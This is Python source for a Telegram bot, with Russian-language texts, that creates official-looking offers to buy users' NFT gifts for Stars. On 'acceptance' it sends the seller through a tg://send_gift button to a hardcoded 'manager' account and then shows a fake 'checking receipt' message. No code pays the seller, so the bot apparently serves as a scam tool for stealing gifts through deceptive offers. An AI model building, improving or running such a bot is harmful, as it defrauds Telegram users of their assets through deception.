import asyncio
import re
import aiosqlite
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, 
    CallbackQuery, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton
)
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.storage.memory import MemoryStorage

# ================== НАСТРОЙКИ ==================
BOT_TOKEN = "ВСТАВЬ_СВОЙ_ТОКЕН_БОТА_СЮДА"

MANAGER_USERNAME = "Autooffersgift"
MANAGER_LINK = "tg://send_gift?to=Autooffersgift"

# Примерный курс Stars → USD (можешь менять)
STARS_TO_USD = 0.013
# ===============================================

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher(storage=MemoryStorage())


# ---------- База данных ----------
async def init_db():
    async with aiosqlite.connect("offers.db") as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                order_id TEXT UNIQUE,
                gift TEXT,
                amount INTEGER,
                currency TEXT,
                seller_id INTEGER,
                buyer_id INTEGER,
                status TEXT DEFAULT 'pending',
                created_at TEXT,
                message_id INTEGER,
                chat_id INTEGER
            )
        """)
        await db.commit()


def generate_order_id() -> str:
    return f"TG-{datetime.now().strftime('%y%m%d%H%M%S')[2:]}"


# ---------- Красивые тексты ----------
def make_offer_text(gift: str, amount: int, buyer_username: str | None = None) -> str:
    usd = round(amount * STARS_TO_USD, 2)
    gift_link = f"https://t.me/nft/{gift}"
    buyer = f"@{buyer_username}" if buyer_username else "Покупатель"

    return f"""
🎁 <b>Новое предложение о покупке</b>

👤 {buyer} предлагает купить ваш NFT-подарок:

🔗 <b><a href="{gift_link}">{gift}</a></b>

💰 <b>Предложение:</b> <code>{amount}</code> ⭐ Stars
💵 ≈ <b>${usd}</b> USD

⏳ Офер действует ограниченное время
""".strip()


def make_accepted_text(gift: str, amount: int, order_id: str) -> str:
    usd = round(amount * STARS_TO_USD, 2)
    gift_link = f"https://t.me/nft/{gift}"

    return f"""
✅ <b>Предложение принято</b>

🎁 NFT: <a href="{gift_link}"><b>{gift}</b></a>
💰 Сумма: <code>{amount}</code> ⭐ Stars (≈ ${usd} USD)
📄 Заказ: <code>{order_id}</code>

━━━━━━━━━━━━━━━━━━━━

Для завершения сделки нажмите кнопку ниже и передайте подарок менеджеру.
""".strip()


def make_waiting_text(amount: int) -> str:
    usd = round(amount * STARS_TO_USD, 2)
    return f"""
⏳ <b>Сейчас проверим поступление подарка менеджеру</b>

Ожидаемое время проверки: <b>до 30 минут</b>

💰 Сумма: <code>{amount}</code> ⭐ Stars
💵 ≈ <b>${usd}</b> USD
""".strip()


# ---------- Клавиатуры ----------
def offer_keyboard(offer_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline:{offer_id}")
        ]
    ])


def accepted_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🎁 Передать подарок", url=MANAGER_LINK)
        ],
        [
            InlineKeyboardButton(text="✅ Подтвердить передачу", callback_data="confirm_transfer")
        ]
    ])


# ---------- Хендлеры ----------
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "👋 Бот офферов NFT-подарков запущен.\n\n"
        "Просто напиши в нужном формате:\n"
        "<code>SnoopCigar-84846 3200 stars</code>"
    )


@dp.message(F.text.regexp(r"^([A-Za-z0-9]+-\d+)\s+(\d+)\s+(stars?|grams?)$", flags=re.IGNORECASE))
async def create_offer(message: Message):
    match = re.match(
        r"^([A-Za-z0-9]+-\d+)\s+(\d+)\s+(stars?|grams?)$",
        message.text.strip(),
        re.IGNORECASE
    )
    if not match:
        return

    gift = match.group(1)
    amount = int(match.group(2))
    currency = match.group(3).lower()
    if currency.startswith("star"):
        currency = "stars"
    else:
        currency = "grams"

    order_id = generate_order_id()

    async with aiosqlite.connect("offers.db") as db:
        cursor = await db.execute(
            """INSERT INTO offers 
               (order_id, gift, amount, currency, seller_id, buyer_id, status, created_at, chat_id) 
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                order_id, gift, amount, currency,
                message.chat.id, message.from_user.id,
                "pending", datetime.now().isoformat(), message.chat.id
            )
        )
        offer_db_id = cursor.lastrowid
        await db.commit()

    text = make_offer_text(gift, amount, message.from_user.username)
    kb = offer_keyboard(offer_db_id)

    sent = await message.answer(text, reply_markup=kb, disable_web_page_preview=False)

    async with aiosqlite.connect("offers.db") as db:
        await db.execute(
            "UPDATE offers SET message_id = ? WHERE id = ?",
            (sent.message_id, offer_db_id)
        )
        await db.commit()


@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    offer_id = int(callback.data.split(":")[1])

    async with aiosqlite.connect("offers.db") as db:
        async with db.execute("SELECT * FROM offers WHERE id = ?", (offer_id,)) as cursor:
            offer = await cursor.fetchone()

    if not offer:
        await callback.answer("Оффер не найден", show_alert=True)
        return

    # columns: id, order_id, gift, amount, currency, ...
    order_id = offer[1]
    gift = offer[2]
    amount = offer[3]

    text = make_accepted_text(gift, amount, order_id)
    kb = accepted_keyboard()

    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer("✅ Предложение принято")

    try:
        await bot.pin_chat_message(callback.message.chat.id, callback.message.message_id)
    except Exception:
        pass

    async with aiosqlite.connect("offers.db") as db:
        await db.execute("UPDATE offers SET status = 'accepted' WHERE id = ?", (offer_id,))
        await db.commit()


@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):
    await callback.message.edit_text("❌ Предложение отклонено")
    await callback.answer()


@dp.callback_query(F.data == "confirm_transfer")
async def confirm_transfer(callback: CallbackQuery):
    async with aiosqlite.connect("offers.db") as db:
        async with db.execute(
            """SELECT amount FROM offers 
               WHERE chat_id = ? AND status = 'accepted' 
               ORDER BY id DESC LIMIT 1""",
            (callback.message.chat.id,)
        ) as cursor:
            row = await cursor.fetchone()

    amount = row[0] if row else 0
    text = make_waiting_text(amount)

    await callback.message.answer(text)
    await callback.answer("Ожидаем поступление...")


# ---------- Запуск ----------
async def main():
    await init_db()
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
